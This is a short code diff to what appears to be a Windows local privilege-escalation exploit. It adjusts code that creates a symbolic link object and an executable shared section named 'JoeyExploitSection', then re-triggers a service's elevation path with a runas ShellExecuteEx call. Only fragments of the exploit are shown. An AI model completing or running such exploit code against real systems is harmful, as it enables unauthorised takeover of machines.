@@ -43,6 +43,8 @@ int wmain() {
     if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &targetName) != 0) return 1;
 
     hSection = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, 0x1000, L"JoeyExploitSection");
+    if (!hSection) goto cleanup;
+
     void* pSharedMemory = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);
     if (!pSharedMemory) goto cleanup;
 
@@ -64,8 +66,8 @@ int wmain() {
 
     // Re-fire the elevation event — forces the service back into the code path
     // that reads the shared section and acts on the 0x48 flag.
-    // NOTE: system("net helpmsg") is a lookup command; it sends no signal to
-    // the service and must not be used here.
+    // NOTE: Sleep() does not signal the service; the ShellExecuteEx runas
+    // trigger is what actually causes the re-read.
     {
         SHELLEXECUTEINFO retrigger = { sizeof(retrigger) };
         retrigger.fMask = SEE_MASK_NOZONECHECKS;
@@ -77,7 +79,7 @@ int wmain() {
 
 cleanup:
     if (hThread) {
-        WaitForSingleObject(hThread, 500);
+        WaitForSingleObject(hThread, 1000);
         CloseHandle(hThread);
     }
     if (hMapping) CloseHandle(hMapping);
